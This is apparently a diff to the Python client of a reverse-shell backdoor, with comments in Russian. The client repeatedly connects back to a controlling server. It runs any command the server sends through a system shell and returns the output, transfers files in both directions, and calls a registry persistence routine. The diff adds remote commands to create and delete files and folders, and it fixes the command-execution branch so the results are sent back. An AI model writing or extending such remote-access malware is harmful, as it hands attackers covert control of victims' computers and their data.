@@ -116,9 +116,9 @@ def connection():
                 # Выход из текущего While (connection)
                 break
             # Если сервер отправил команду Disconnect,
-            # То мы разрывам с ним соединение (удлаив сокет)
+            # То мы разрывам с ним соединение (удалив сокет)
             # При этом сразу же создаем новый, чтобы 
-            # восстановить поытки соединения после разъединения
+            # восстановить попытки соединения после разъединения
             elif result == DISCONNECT:
                 s.close()
                 time.sleep(20)
@@ -159,6 +159,19 @@ def shell():
             reliable_send(",".join(os.listdir()))
         elif command[:2] == 'ls':
             reliable_send(",".join(os.listdir()))
+        elif command[:12] == 'create_file ':
+            f = open(command[12:], 'w+')
+            f.close()
+            reliable_send(",".join(os.listdir()))
+        elif command[:12] == 'delete_file ':
+            os.remove(command[12:])
+            reliable_send(",".join(os.listdir()))
+        elif command[:14] == 'create_folder ':
+            os.mkdir(command[14:])
+            reliable_send(",".join(os.listdir()))
+        elif command[:14] == 'delete_folder ':
+            os.rmdir(command[14:])
+            reliable_send(",".join(os.listdir()))
         elif command[:7] == 'upload ':
             download_file(command[7:])
         elif command[:9] == 'download ':
@@ -190,14 +203,24 @@ def shell():
             reg_name, copy_name = command[12:].split(' ')
             persist(reg_name, copy_name)
         else:
-            execute = subprocess.Popen(command,
-                                       shell=True,
-                                       stdout=subprocess.PIPE,
-                                       stderr=subprocess.PIPE,
-                                       stdin=subprocess.PIPE)
-            result = execute.stdout.read() + execute.stderr.read()
-            result = result.decode()
-            reliable_recv()
+            try:
+                print('try 1')
+                execute = subprocess.Popen(command,
+                                           shell=True,
+                                           stdout=subprocess.PIPE,
+                                           stderr=subprocess.PIPE,
+                                           stdin=subprocess.PIPE)
+                print('try 2')
+                result = execute.stdout.read() + execute.stderr.read()
+                print('try 3' + result)
+                result = result.decode()
+                print('Ok, recive' + result)
+                reliable_send(result)
+                #reliable_recv()
+                #print('try 5')
+            except:
+                print('shell except')
+                reliable_send('Ой-ой, команда (' + command + ') не была распознана shell')
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection()
